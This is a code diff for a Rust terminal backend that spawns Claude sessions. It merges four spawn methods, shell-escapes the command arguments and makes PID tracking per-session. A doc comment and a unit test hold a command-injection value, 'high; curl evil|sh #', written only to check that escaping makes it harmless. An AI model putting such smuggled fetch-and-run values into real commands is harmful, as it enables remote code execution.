@@ -15,12 +15,12 @@ use std::path::{Path, PathBuf};
 use std::process::Command;
 
 use crate::claude::find_claude_path;
-use crate::models::session::Session;
+use crate::models::session::{Session, SessionType};
 use crate::models::stage::Stage;
 use crate::models::worktree::Worktree;
 
 pub use detection::detect_terminal;
-pub use pid_tracking::{cleanup_stage_files, create_wrapper_script, read_pid_file};
+pub use pid_tracking::{cleanup_stage_files, create_wrapper_script, read_pid_entry, read_pid_file};
 pub use spawner::spawn_in_terminal;
 pub use window_ops::{close_window_by_title, window_exists_by_title};
 #[cfg(target_os = "macos")]
@@ -64,8 +64,11 @@ fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalE
 /// prompt as the RC session name and claude starts with no initial prompt
 /// (the session sits idle / "stuck").
 ///
-/// `model` and `effort` are interpolated verbatim; callers are responsible for
-/// any shell-escaping (matching the pre-existing per-site behavior).
+/// `claude_path`, `model`, and `effort` are passed RAW and shell-escaped here.
+/// This is a command-construction trust boundary: a model like `opus[1m]`
+/// would otherwise be glob-expanded by the shell, and a tampered effort such
+/// as `high; curl evil|sh #` would be command injection. `escaped_prompt` is
+/// pre-escaped by the caller (it is built from a trusted signal path).
 fn build_claude_command(
     claude_path: &str,
     model: &str,
@@ -73,6 +76,9 @@ fn build_claude_command(
     remote_control_enabled: bool,
     escaped_prompt: &str,
 ) -> String {
+    let claude_path = escape(Cow::Borrowed(claude_path));
+    let model = escape(Cow::Borrowed(model));
+    let effort = escape(Cow::Borrowed(effort));
     let remote_control_flag = if remote_control_enabled {
         " --remote-control"
     } else {
@@ -103,18 +109,24 @@ impl NativeBackend {
         &self.terminal
     }
 
-    /// Returns (window_title, pid_file_key) for a session — preferring the
-    /// session's tracking_key, with a legacy fallback to the bare stage id.
+    /// Returns `(window_title, pid_file_key)` for a session.
+    ///
+    /// - `window_title` is the session's `tracking_key` (`loom-[<kind>-]<id>`),
+    ///   matched EXACTLY against OS window titles (O-5).
+    /// - `pid_file_key` is `tracking_key + session.id` — the per-session key the
+    ///   spawn path used to name the PID file, so two consecutive sessions for
+    ///   the same stage never collide (O-14).
+    ///
+    /// Falls back to the bare stage id for legacy sessions with no
+    /// `tracking_key`.
     fn window_title_and_pid_key(session: &Session) -> Option<(String, String)> {
-        if !session.tracking_key.is_empty() {
-            let title = session.tracking_key.clone();
-            let pid_key = title.strip_prefix("loom-").unwrap_or(&title).to_string();
-            return Some((title, pid_key));
-        }
-        session
-            .stage_id
-            .as_ref()
-            .map(|sid| (format!("loom-{sid}"), sid.clone()))
+        let title = if !session.tracking_key.is_empty() {
+            session.tracking_key.clone()
+        } else {
+            format!("loom-{}", session.stage_id.as_ref()?)
+        };
+        let pid_key = format!("{}-{}", title, session.id);
+        Some((title, pid_key))
     }
 
     pub fn spawn_session(
@@ -124,74 +136,14 @@ impl NativeBackend {
         session: Session,
         signal_path: &Path,
     ) -> Result<Session> {
-        let worktree_path = worktree.path.to_str().ok_or_else(|| {
-            anyhow::anyhow!(
-                "Worktree path contains invalid UTF-8: {}",
-                worktree.path.display()
-            )
-        })?;
-
-        // Build the title for the terminal window
-        let title = format!("loom-{}", stage.id);
-
-        // Build the initial prompt for Claude
-        let signal_path_str = signal_path.to_string_lossy();
-        let initial_prompt = format!(
-            "Read the signal file at {signal_path_str} and execute the assigned stage work. \
-             This file contains your assignment, tasks, acceptance criteria, \
-             and context files to read."
-        );
-
-        // Escape the prompt for shell
-        let escaped_prompt = escape(Cow::Borrowed(&initial_prompt));
-
-        // Find claude's absolute path (needed for macOS where terminals don't inherit PATH)
-        let claude_path = find_claude_path()?;
-        let model = escape(Cow::Borrowed(stage.effective_model()));
-        let effort = stage.effective_reasoning_effort();
-        let remote_control_enabled = crate::remote_control::resolve(&self.work_dir);
-        let claude_cmd = build_claude_command(
-            &claude_path.display().to_string(),
-            &model,
-            effort,
-            remote_control_enabled,
-            &escaped_prompt,
-        );
-
-        // Create wrapper script that writes PID before exec'ing claude
-        // Pass the worktree path so the script can cd there (important for macOS)
-        // Pass the session.id so LOOM_SESSION_ID env var is set for hooks and memory commands
-        let wrapper_path = pid_tracking::create_wrapper_script(
-            &self.work_dir,
-            &stage.id,
-            &session.id,
-            &claude_cmd,
-            Some(Path::new(worktree_path)),
-        )?;
-
-        // Build the command that runs the wrapper script
-        // IMPORTANT: Use absolute path because macOS terminals open in home directory
-        let wrapper_path_abs = wrapper_path.canonicalize().unwrap_or(wrapper_path);
-        let wrapper_cmd = wrapper_path_abs.to_string_lossy();
-
-        // Spawn the terminal with PID tracking enabled
-        let pid = spawn_in_terminal(
-            &self.terminal,
-            &title,
-            Path::new(worktree_path),
-            &wrapper_cmd,
-            Some(&self.work_dir),
-            Some(&stage.id),
-        )?;
-
-        // Update the session with spawn info
-        let mut session = session;
-        session.set_worktree_path(worktree.path.clone());
-        session.assign_to_stage(stage.id.clone());
-        session.set_pid(pid);
-        session.try_mark_running()?;
-
-        Ok(session)
+        self.spawn(
+            SessionType::Stage,
+            stage,
+            session,
+            signal_path,
+            &worktree.path,
+            true,
+        )
     }
 
     pub fn spawn_merge_session(
@@ -201,73 +153,14 @@ impl NativeBackend {
         signal_path: &Path,
         repo_root: &Path,
     ) -> Result<Session> {
-        let repo_root_str = repo_root.to_str().ok_or_else(|| {
-            anyhow::anyhow!(
-                "Repository path contains invalid UTF-8: {}",
-                repo_root.display()
-            )
-        })?;
-
-        // Build the title for the merge session window
-        let title = format!("loom-merge-{}", stage.id);
-
-        // Build the initial prompt for Claude merge session
-        let signal_path_str = signal_path.to_string_lossy();
-        let initial_prompt = format!(
-            "Read the merge signal file at {signal_path_str} and resolve the merge conflicts. \
-             This file contains the conflicting files, merge context, and resolution instructions."
-        );
-
-        // Escape the prompt for shell
-        let escaped_prompt = escape(Cow::Borrowed(&initial_prompt));
-
-        // Find claude's absolute path (needed for macOS where terminals don't inherit PATH)
-        let claude_path = find_claude_path()?;
-        // Merge conflict resolution always runs on opus[1m] with xhigh reasoning,
-        // regardless of the originating stage's model/effort — conflicts benefit
-        // from the strongest model and maximum deliberation.
-        let remote_control_enabled = crate::remote_control::resolve(&self.work_dir);
-        let claude_cmd = build_claude_command(
-            &claude_path.display().to_string(),
-            "opus[1m]",
-            "xhigh",
-            remote_control_enabled,
-            &escaped_prompt,
-        );
-
-        // Create wrapper script for merge session
-        // Pass repo root so the script can cd there (important for macOS)
-        let wrapper_path = pid_tracking::create_wrapper_script(
-            &self.work_dir,
-            &format!("merge-{}", stage.id),
-            &session.id,
-            &claude_cmd,
-            Some(Path::new(repo_root_str)),
-        )?;
-
-        // Build the command that runs the wrapper script
-        // IMPORTANT: Use absolute path because macOS terminals open in home directory
-        let wrapper_path_abs = wrapper_path.canonicalize().unwrap_or(wrapper_path);
-        let wrapper_cmd = wrapper_path_abs.to_string_lossy();
-
-        // Spawn the terminal in the main repository (not worktree)
-        let pid = spawn_in_terminal(
-            &self.terminal,
-            &title,
-            Path::new(repo_root_str),
-            &wrapper_cmd,
-            Some(&self.work_dir),
-            Some(&format!("merge-{}", stage.id)),
-        )?;
-
-        // Update the session with spawn info
-        // Note: For merge sessions, we don't set worktree_path since we're in the main repo
-        let mut session = session;
-        session.assign_to_stage(stage.id.clone());
-        session.set_pid(pid);
-        session.try_mark_running()?;
-
-        Ok(session)
+        self.spawn(
+            SessionType::Merge,
+            stage,
+            session,
+            signal_path,
+            repo_root,
+            false,
+        )
     }
 
     pub fn spawn_base_conflict_session(
@@ -277,74 +170,14 @@ impl NativeBackend {
         signal_path: &Path,
         repo_root: &Path,
     ) -> Result<Session> {
-        let repo_root_str = repo_root.to_str().ok_or_else(|| {
-            anyhow::anyhow!(
-                "Repository path contains invalid UTF-8: {}",
-                repo_root.display()
-            )
-        })?;
-
-        // Build the title for the base conflict session window
-        let title = format!("loom-base-conflict-{}", stage.id);
-
-        // Build the initial prompt for Claude base conflict resolution session
-        let signal_path_str = signal_path.to_string_lossy();
-        let initial_prompt = format!(
-            "Read the base conflict signal file at {signal_path_str} and resolve the merge conflicts. \
-             This file contains the conflicting files from merging dependency branches, \
-             and instructions for resolution. After resolving, tell the user to run `loom retry {}`.",
-            stage.id
-        );
-
-        // Escape the prompt for shell
-        let escaped_prompt = escape(Cow::Borrowed(&initial_prompt));
-
-        // Find claude's absolute path (needed for macOS where terminals don't inherit PATH)
-        let claude_path = find_claude_path()?;
-        // Base-branch conflict resolution always runs on opus[1m] with xhigh
-        // reasoning — same rationale as merge conflict sessions.
-        let remote_control_enabled = crate::remote_control::resolve(&self.work_dir);
-        let claude_cmd = build_claude_command(
-            &claude_path.display().to_string(),
-            "opus[1m]",
-            "xhigh",
-            remote_control_enabled,
-            &escaped_prompt,
-        );
-
-        // Create wrapper script for base conflict session
-        // Pass repo root so the script can cd there (important for macOS)
-        let wrapper_path = pid_tracking::create_wrapper_script(
-            &self.work_dir,
-            &format!("base-conflict-{}", stage.id),
-            &session.id,
-            &claude_cmd,
-            Some(Path::new(repo_root_str)),
-        )?;
-
-        // Build the command that runs the wrapper script
-        // IMPORTANT: Use absolute path because macOS terminals open in home directory
-        let wrapper_path_abs = wrapper_path.canonicalize().unwrap_or(wrapper_path);
-        let wrapper_cmd = wrapper_path_abs.to_string_lossy();
-
-        // Spawn the terminal in the main repository (not worktree)
-        let pid = spawn_in_terminal(
-            &self.terminal,
-            &title,
-            Path::new(repo_root_str),
-            &wrapper_cmd,
-            Some(&self.work_dir),
-            Some(&format!("base-conflict-{}", stage.id)),
-        )?;
-
-        // Update the session with spawn info
-        // Note: For base conflict sessions, we don't set worktree_path since we're in the main repo
-        let mut session = session;
-        session.assign_to_stage(stage.id.clone());
-        session.set_pid(pid);
-        session.try_mark_running()?;
-
-        Ok(session)
+        self.spawn(
+            SessionType::BaseConflict,
+            stage,
+            session,
+            signal_path,
+            repo_root,
+            false,
+        )
     }
 
     pub fn spawn_knowledge_session(
@@ -354,69 +187,145 @@ impl NativeBackend {
         signal_path: &Path,
         repo_root: &Path,
     ) -> Result<Session> {
-        let repo_root_str = repo_root.to_str().ok_or_else(|| {
+        self.spawn(
+            SessionType::Knowledge,
+            stage,
+            session,
+            signal_path,
+            repo_root,
+            false,
+        )
+    }
+
+    /// Unified spawn for every native session type.
+    ///
+    /// The per-kind variation (window title / PID-file key prefix, prompt,
+    /// model/effort source, working directory) is derived from `kind` and the
+    /// session's `tracking_key`, collapsing what used to be four ~85% identical
+    /// methods (A-12 / D-3). The four public `spawn_*` methods are thin
+    /// wrappers so out-of-cluster callers keep their signatures.
+    ///
+    /// * `kind` — selects the prompt and the model/effort policy.
+    /// * `cwd` — the directory the wrapper `cd`s into and the terminal spawns
+    ///   from (the worktree for stage sessions, the repo root otherwise).
+    /// * `set_worktree_path` — only stage sessions record a worktree path; the
+    ///   others run in the main repo.
+    fn spawn(
+        &self,
+        kind: SessionType,
+        stage: &Stage,
+        session: Session,
+        signal_path: &Path,
+        cwd: &Path,
+        set_worktree_path: bool,
+    ) -> Result<Session> {
+        let cwd_str = cwd.to_str().ok_or_else(|| {
             anyhow::anyhow!(
-                "Repository path contains invalid UTF-8: {}",
-                repo_root.display()
+                "Session working directory contains invalid UTF-8: {}",
+                cwd.display()
             )
         })?;
 
-        // Build the title for the knowledge session window
-        let title = format!("loom-knowledge-{}", stage.id);
+        // Assign the stage first so `tracking_key` is set for the (stage, kind)
+        // pair; the window title IS the tracking_key and the PID-file key is
+        // derived from it. (Idempotent for knowledge sessions, which derived it
+        // at construction.)
+        let mut session = session;
+        session.session_type = kind;
+        session.assign_to_stage(stage.id.clone());
 
-        // Build the initial prompt for Claude knowledge gathering session
+        // Window title and the stage-key portion of the wrapper's LOOM_STAGE_ID.
+        // `tracking_key` is `loom-[<kind>-]<stage-id>`; stripping `loom-` yields
+        // the value passed historically as the wrapper's stage id.
+        let title = session.tracking_key.clone();
+        let wrapper_stage_id = title.strip_prefix("loom-").unwrap_or(&title).to_string();
+
+        // Per-session PID-file key (tracking_key + session.id) so two
+        // consecutive sessions for the same stage never share a PID file (O-14).
+        let pid_key = format!("{}-{}", title, session.id);
+
+        // Build the kind-specific initial prompt.
         let signal_path_str = signal_path.to_string_lossy();
-        let initial_prompt = format!(
-            "Read the signal file at {signal_path_str} and execute the assigned knowledge gathering work. \
-             This file contains your assignment, tasks, acceptance criteria, \
-             and instructions for populating the knowledge base."
-        );
-
-        // Escape the prompt for shell
+        let initial_prompt = match kind {
+            SessionType::Stage => format!(
+                "Read the signal file at {signal_path_str} and execute the assigned stage work. \
+                 This file contains your assignment, tasks, acceptance criteria, \
+                 and context files to read."
+            ),
+            SessionType::Merge => format!(
+                "Read the merge signal file at {signal_path_str} and resolve the merge conflicts. \
+                 This file contains the conflicting files, merge context, and resolution instructions."
+            ),
+            SessionType::BaseConflict => format!(
+                "Read the base conflict signal file at {signal_path_str} and resolve the merge conflicts. \
+                 This file contains the conflicting files from merging dependency branches, \
+                 and instructions for resolution. After resolving, tell the user to run `loom retry {}`.",
+                stage.id
+            ),
+            SessionType::Knowledge => format!(
+                "Read the signal file at {signal_path_str} and execute the assigned knowledge gathering work. \
+                 This file contains your assignment, tasks, acceptance criteria, \
+                 and instructions for populating the knowledge base."
+            ),
+        };
         let escaped_prompt = escape(Cow::Borrowed(&initial_prompt));
 
-        // Find claude's absolute path (needed for macOS where terminals don't inherit PATH)
+        // Model/effort POLICY (kept explicit, not buried). Merge and
+        // base-conflict resolution always run on the strongest model with
+        // maximum deliberation regardless of the originating stage's settings;
+        // stage and knowledge sessions use the stage's effective values.
+        let (model, effort) = match kind {
+            SessionType::Merge | SessionType::BaseConflict => ("opus[1m]", "xhigh"),
+            SessionType::Stage | SessionType::Knowledge => {
+                (stage.effective_model(), stage.effective_reasoning_effort())
+            }
+        };
+
+        // Find claude's absolute path (needed for macOS where terminals don't inherit PATH).
+        // build_claude_command shell-escapes the path, model, and effort (S-3).
         let claude_path = find_claude_path()?;
-        let model = escape(Cow::Borrowed(stage.effective_model()));
-        let effort = stage.effective_reasoning_effort();
         let remote_control_enabled = crate::remote_control::resolve(&self.work_dir);
         let claude_cmd = build_claude_command(
             &claude_path.display().to_string(),
-            &model,
+            model,
             effort,
             remote_control_enabled,
             &escaped_prompt,
         );
 
-        // Create wrapper script for knowledge session
-        // Pass repo root so the script can cd there (important for macOS)
+        // Create the wrapper script (writes PID + start-time before exec'ing
+        // claude). `wrapper_stage_id` sets LOOM_STAGE_ID; `pid_key` names the
+        // per-session PID file. Pass cwd so the script can cd there (macOS).
         let wrapper_path = pid_tracking::create_wrapper_script(
             &self.work_dir,
-            &format!("knowledge-{}", stage.id),
+            &pid_key,
+            &wrapper_stage_id,
             &session.id,
             &claude_cmd,
-            Some(Path::new(repo_root_str)),
+            Some(cwd),
         )?;
 
-        // Build the command that runs the wrapper script
-        // IMPORTANT: Use absolute path because macOS terminals open in home directory
+        // Build the command that runs the wrapper script.
+        // IMPORTANT: Use absolute path because macOS terminals open in home directory.
         let wrapper_path_abs = wrapper_path.canonicalize().unwrap_or(wrapper_path);
         let wrapper_cmd = wrapper_path_abs.to_string_lossy();
 
-        // Spawn the terminal in the main repository (not worktree)
+        // Spawn the terminal with PID tracking constrained by this session's
+        // LOOM_SESSION_ID marker (O-14).
         let pid = spawn_in_terminal(
             &self.terminal,
             &title,
-            Path::new(repo_root_str),
+            Path::new(cwd_str),
             &wrapper_cmd,
             Some(&self.work_dir),
-            Some(&format!("knowledge-{}", stage.id)),
+            Some(&pid_key),
+            Some(&session.id),
         )?;
 
-        // Update the session with spawn info
-        // Note: For knowledge sessions, we don't set worktree_path since we're in the main repo
-        let mut session = session;
-        session.assign_to_stage(stage.id.clone());
+        // Update the session with spawn info.
+        if set_worktree_path {
+            session.set_worktree_path(cwd.to_path_buf());
+        }
         session.set_pid(pid);
         session.try_mark_running()?;
 
@@ -445,7 +354,24 @@ impl NativeBackend {
         // didn't work (e.g., no wmctrl/xdotool installed, or window already closed).
         // This works correctly for terminals like kitty/alacritty where each window
         // has its own process.
-        if let Some(pid) = session.pid {
+        //
+        // Determine which PID to signal. Prefer the per-session PID file because
+        // it carries the recorded start-time: if the PID was recycled by an
+        // unrelated process, the entry no longer matches and we must NOT signal
+        // it (O-14 — never SIGTERM a stranger). Fall back to `session.pid` only
+        // when there is no PID-file evidence to the contrary.
+        let pid_to_kill = match resolved.as_ref() {
+            Some((_, pid_key)) => match read_pid_entry(&self.work_dir, pid_key) {
+                Some(entry) if pid_tracking::pid_matches_entry(&entry) => Some(entry.pid),
+                // PID file present but mismatched/dead → reused or gone; do not kill.
+                Some(_) => None,
+                // No PID file → fall back to the session's stored PID.
+                None => session.pid,
+            },
+            None => session.pid,
+        };
+
+        if let Some(pid) = pid_to_kill {
             // Send SIGTERM to the process
             let output = Command::new("kill")
                 .arg("-TERM")
@@ -460,11 +386,11 @@ impl NativeBackend {
                     bail!("Failed to kill process {pid}: {stderr}");
                 }
             }
+        }
 
-            // Clean up tracking files
-            if let Some((_, pid_key)) = &resolved {
-                cleanup_stage_files(&self.work_dir, pid_key);
-            }
+        // Clean up tracking files regardless of whether a process was signaled.
+        if let Some((_, pid_key)) = &resolved {
+            cleanup_stage_files(&self.work_dir, pid_key);
         }
         Ok(())
     }
@@ -480,28 +406,24 @@ impl NativeBackend {
         // session's tracking_key so prefixed sessions resolve correctly.
         let resolved = Self::window_title_and_pid_key(session);
 
-        // First, try to get the most current PID from the PID file
+        // First, try the per-session PID file. Verify BOTH liveness and the
+        // recorded process start-time so a recycled PID (an unrelated process
+        // that inherited the dead session's PID) is not reported as alive (O-14).
         if let Some((_, pid_key)) = &resolved {
-            if let Some(current_pid) = read_pid_file(&self.work_dir, pid_key) {
-                // We have a PID from the tracking file, check if it's alive
-                if crate::process::is_process_alive(current_pid) {
+            if let Some(entry) = read_pid_entry(&self.work_dir, pid_key) {
+                if pid_tracking::pid_matches_entry(&entry) {
                     return Ok(true);
                 }
-                // PID file exists but process is dead - clean up and continue checking
+                // PID file exists but the process is dead (or reused) - clean
+                // up and continue checking.
                 cleanup_stage_files(&self.work_dir, pid_key);
             }
         }
 
-        // Fallback to the stored PID from the session
+        // Fallback to the stored PID from the session, via the nix syscall
+        // helper instead of spawning a `kill -0` subprocess (P-7).
         if let Some(pid) = session.pid {
-            // Check if process exists using kill -0
-            let output = Command::new("kill")
-                .arg("-0")
-                .arg(pid.to_string())
-                .output()
-                .context("Failed to check process status")?;
-
-            if output.status.success() {
+            if crate::process::is_process_alive(pid) {
                 return Ok(true);
             }
         }
@@ -539,8 +461,10 @@ mod tests {
         let mut session = Session::new();
         session.assign_to_stage("worker-pool".to_string());
         let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
+        // Title is the tracking_key, matched exactly against window titles.
         assert_eq!(title, "loom-worker-pool");
-        assert_eq!(pid_key, "worker-pool");
+        // PID-file key is per-session: tracking_key + session.id (O-14).
+        assert_eq!(pid_key, format!("loom-worker-pool-{}", session.id));
     }
 
     #[test]
@@ -549,7 +473,7 @@ mod tests {
         session.assign_to_stage("feature".to_string());
         let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
         assert_eq!(title, "loom-merge-feature");
-        assert_eq!(pid_key, "merge-feature");
+        assert_eq!(pid_key, format!("loom-merge-feature-{}", session.id));
     }
 
     #[test]
@@ -557,7 +481,7 @@ mod tests {
         let session = Session::new_knowledge("kb");
         let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
         assert_eq!(title, "loom-knowledge-kb");
-        assert_eq!(pid_key, "knowledge-kb");
+        assert_eq!(pid_key, format!("loom-knowledge-kb-{}", session.id));
     }
 
     #[test]
@@ -566,7 +490,10 @@ mod tests {
         session.assign_to_stage("feature".to_string());
         let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
         assert_eq!(title, "loom-base-conflict-feature");
-        assert_eq!(pid_key, "base-conflict-feature");
+        assert_eq!(
+            pid_key,
+            format!("loom-base-conflict-feature-{}", session.id)
+        );
     }
 
     #[test]
@@ -577,7 +504,7 @@ mod tests {
         session.tracking_key = String::new();
         let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
         assert_eq!(title, "loom-legacy");
-        assert_eq!(pid_key, "legacy");
+        assert_eq!(pid_key, format!("loom-legacy-{}", session.id));
     }
 
     #[test]
@@ -588,11 +515,47 @@ mod tests {
     }
 
     #[test]
+    fn pid_key_distinct_per_session_for_same_stage() {
+        // O-14(a): two consecutive sessions for the SAME stage must get
+        // distinct PID-file keys, or liveness for the old session would read
+        // the new session's PID.
+        let mut s1 = Session::new();
+        s1.assign_to_stage("auth".to_string());
+        let mut s2 = Session::new();
+        s2.assign_to_stage("auth".to_string());
+
+        let (title1, key1) = NativeBackend::window_title_and_pid_key(&s1).unwrap();
+        let (title2, key2) = NativeBackend::window_title_and_pid_key(&s2).unwrap();
+        assert_eq!(title1, title2, "same stage → same window title");
+        assert_ne!(key1, key2, "different session → different PID-file key");
+    }
+
+    #[test]
+    fn prefix_sharing_stage_ids_get_distinct_titles() {
+        // O-5: `auth` and `auth-tests` must resolve to distinct window titles
+        // so kill/liveness for one never targets the other.
+        let mut auth = Session::new();
+        auth.assign_to_stage("auth".to_string());
+        let mut auth_tests = Session::new();
+        auth_tests.assign_to_stage("auth-tests".to_string());
+
+        let (auth_title, _) = NativeBackend::window_title_and_pid_key(&auth).unwrap();
+        let (auth_tests_title, _) = NativeBackend::window_title_and_pid_key(&auth_tests).unwrap();
+        assert_eq!(auth_title, "loom-auth");
+        assert_eq!(auth_tests_title, "loom-auth-tests");
+        assert_ne!(auth_title, auth_tests_title);
+        // The exact-match window ops (tested in window_ops.rs) ensure
+        // `loom-auth` never matches `loom-auth-tests`.
+    }
+
+    #[test]
     fn build_claude_command_omits_remote_control_when_disabled() {
         let cmd = build_claude_command("/usr/bin/claude", "opus[1m]", "xhigh", false, "'prompt'");
+        // The model `opus[1m]` is shell-escaped (the `[` `]` are glob chars),
+        // so it is single-quoted rather than left bare (S-3).
         assert_eq!(
             cmd,
-            "/usr/bin/claude --model opus[1m] --effort xhigh 'prompt'"
+            "/usr/bin/claude --model 'opus[1m]' --effort xhigh 'prompt'"
         );
         assert!(!cmd.contains("--remote-control"));
     }
@@ -600,6 +563,8 @@ mod tests {
     #[test]
     fn build_claude_command_appends_remote_control_when_enabled() {
         let cmd = build_claude_command("/usr/bin/claude", "sonnet", "high", true, "'prompt'");
+        // `sonnet`/`high`/`/usr/bin/claude` contain only shell-safe chars, so
+        // escaping leaves them unquoted.
         assert_eq!(
             cmd,
             "/usr/bin/claude --model sonnet --effort high 'prompt' --remote-control"
@@ -609,5 +574,29 @@ mod tests {
         let rc_idx = cmd.find("--remote-control").unwrap();
         let prompt_idx = cmd.find("'prompt'").unwrap();
         assert!(prompt_idx < rc_idx);
+    }
+
+    #[test]
+    fn build_claude_command_escapes_effort_injection() {
+        // S-3: a tampered reasoning effort must be neutralized, not interpolated
+        // raw into the exec'd command line.
+        let cmd = build_claude_command(
+            "/usr/bin/claude",
+            "sonnet",
+            "high; curl evil|sh #",
+            false,
+            "'prompt'",
+        );
+        // The whole effort token is single-quoted, so no `;`/`|`/`#` is active.
+        assert!(cmd.contains("--effort 'high; curl evil|sh #'"));
+        assert!(!cmd.contains("--effort high; curl"));
+    }
+
+    #[test]
+    fn build_claude_command_escapes_claude_path_with_spaces() {
+        // S-3: a claude path containing spaces must be quoted so the wrapper's
+        // `exec` doesn't split it into multiple words.
+        let cmd = build_claude_command("/opt/My Tools/claude", "sonnet", "high", false, "'prompt'");
+        assert!(cmd.starts_with("'/opt/My Tools/claude' --model sonnet"));
     }
 }
